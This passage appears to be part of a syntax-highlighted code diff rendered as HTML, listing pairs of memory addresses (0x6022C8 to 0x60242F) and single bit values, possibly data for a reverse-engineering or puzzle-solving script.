+    (<span style="color:#ae81ff">0x6022C8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022C9</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022CA</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022CB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022CC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022CD</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022CE</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022CF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6022D0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022D1</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022D2</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022D3</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022D4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022D5</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022D6</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022D7</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6022D8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022D9</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022DA</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022DB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022DC</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022DD</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022DE</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022DF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6022E0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022E1</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022E2</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022E3</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022E4</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022E5</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022E6</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022E7</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6022E8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022E9</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022EA</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022EB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022EC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022ED</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022EE</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022EF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6022F0</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022F1</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022F2</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022F3</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022F4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022F5</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022F6</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022F7</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6022F8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022F9</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022FA</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022FB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022FC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022FD</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6022FE</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6022FF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602300</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602301</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602302</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602303</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602304</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602305</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602306</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602307</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602308</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602309</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60230A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60230B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60230C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60230D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60230E</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60230F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602310</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602311</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602312</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602313</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602314</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602315</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602316</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602317</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602318</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602319</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60231A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60231B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60231C</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60231D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60231E</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60231F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602320</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602321</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602322</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602323</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602324</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602325</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602326</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602327</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602328</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602329</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60232A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60232B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60232C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60232D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60232E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60232F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602330</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602331</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602332</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602333</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602334</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602335</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602336</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602337</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602338</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602339</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60233A</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60233B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60233C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60233D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60233E</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60233F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602340</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602341</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602342</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602343</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602344</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602345</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602346</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602347</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602348</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602349</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60234A</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60234B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60234C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60234D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60234E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60234F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602350</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602351</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602352</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602353</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602354</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602355</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602356</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602357</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602358</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602359</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60235A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60235B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60235C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60235D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60235E</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60235F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602360</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602361</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602362</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602363</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602364</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602365</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602366</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602367</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602368</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602369</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60236A</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60236B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60236C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60236D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60236E</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60236F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602370</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602371</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602372</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602373</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602374</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602375</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602376</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602377</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602378</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602379</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60237A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60237B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60237C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60237D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60237E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60237F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602380</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602381</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602382</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602383</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602384</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602385</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602386</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602387</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602388</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602389</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60238A</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60238B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60238C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60238D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60238E</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60238F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602390</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602391</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602392</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602393</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602394</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602395</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602396</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602397</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602398</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602399</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60239A</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60239B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60239C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60239D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60239E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60239F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6023A0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023A1</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023A2</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023A3</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023A4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023A5</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023A6</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023A7</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6023A8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023A9</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023AA</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023AB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023AC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023AD</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023AE</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023AF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6023B0</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023B1</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023B2</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023B3</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023B4</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023B5</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023B6</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023B7</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6023B8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023B9</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023BA</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023BB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023BC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023BD</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023BE</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023BF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6023C0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023C1</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023C2</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023C3</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023C4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023C5</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023C6</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023C7</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6023C8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023C9</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023CA</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023CB</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023CC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023CD</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023CE</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023CF</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6023D0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023D1</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023D2</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023D3</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023D4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023D5</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023D6</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023D7</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6023D8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023D9</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023DA</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023DB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023DC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023DD</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023DE</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023DF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6023E0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023E1</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023E2</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023E3</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023E4</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023E5</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023E6</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023E7</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x6023E8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023E9</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023EA</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023EB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023EC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023ED</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023EE</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023EF</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6023F0</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023F1</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023F2</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023F3</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023F4</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023F5</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023F6</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023F7</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x6023F8</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023F9</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023FA</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023FB</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023FC</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023FD</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x6023FE</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x6023FF</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602400</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602401</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602402</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602403</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602404</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602405</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602406</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602407</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602408</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602409</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60240A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60240B</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60240C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60240D</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60240E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60240F</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602410</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602411</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602412</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602413</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602414</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602415</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602416</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602417</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602418</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602419</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60241A</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60241B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60241C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60241D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60241E</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60241F</span>, <span style="color:#ae81ff">0</span>),
+    (<span style="color:#ae81ff">0x602420</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602421</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602422</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602423</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602424</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602425</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x602426</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602427</span>, <span style="color:#ae81ff">1</span>),
+    (<span style="color:#ae81ff">0x602428</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x602429</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60242A</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60242B</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60242C</span>, <span style="color:#ae81ff">1</span>), (<span style="color:#ae81ff">0x60242D</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60242E</span>, <span style="color:#ae81ff">0</span>), (<span style="color:#ae81ff">0x60242F</span>, <span style="color:#ae81ff">1</span>),
